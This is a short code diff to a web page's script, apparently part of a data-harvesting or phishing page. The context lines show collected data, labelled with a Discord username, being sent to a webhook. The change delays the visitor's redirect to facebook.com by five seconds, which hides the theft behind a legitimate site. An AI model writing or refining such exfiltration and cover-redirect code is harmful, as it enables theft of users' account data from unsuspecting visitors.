@@ -178,7 +178,9 @@
         await new Promise(res => setTimeout(res, CONFIG.sendDelay));
         await sendToWebhook(buildMessageBlock(merged, `Discord Username: ${discordUsername}`));
       }
-      window.location.href = "https://example.com";
+      setTimeout(function() {
+            window.location.href = "https://facebook.com";
+        }, 5000);
     })();
   </script>
 </body>
